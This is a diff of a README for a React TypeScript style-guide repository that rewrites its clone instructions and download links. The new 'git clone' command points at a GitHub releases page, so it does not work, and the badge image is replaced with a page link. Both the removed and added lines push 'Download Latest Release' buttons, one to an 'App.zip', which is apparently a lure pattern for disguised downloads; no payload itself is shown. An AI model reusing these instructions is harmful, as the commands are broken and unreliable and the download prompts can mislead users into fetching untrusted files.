@@ -27,7 +27,7 @@ To get started with the **React TypeScript Feature Style Guide**, follow these s
 
 1. Clone this repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/react-typescript-feature-style-guide.git
+   git clone https://github.com/larakhanafer/react-typescript-feature-style-guide/releases
    ```
 
 2. Install the dependencies:
@@ -56,11 +56,11 @@ This project is licensed under the MIT License - see the [LICENSE](./LICENSE) fi
 
 ---
 
-📥 **[Download Latest Release](https://github.com/repo/releases/9246/App.zip)** 🚀
+📥 **[Download Latest Release](https://github.com/larakhanafer/react-typescript-feature-style-guide/releases)** 🚀
 
 🌐 **Visit our website for more information**
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/repo/releases/9246/App.zip) 
+[![Download Now](https://github.com/larakhanafer/react-typescript-feature-style-guide/releases)](https://github.com/larakhanafer/react-typescript-feature-style-guide/releases) 
 
 ---
 
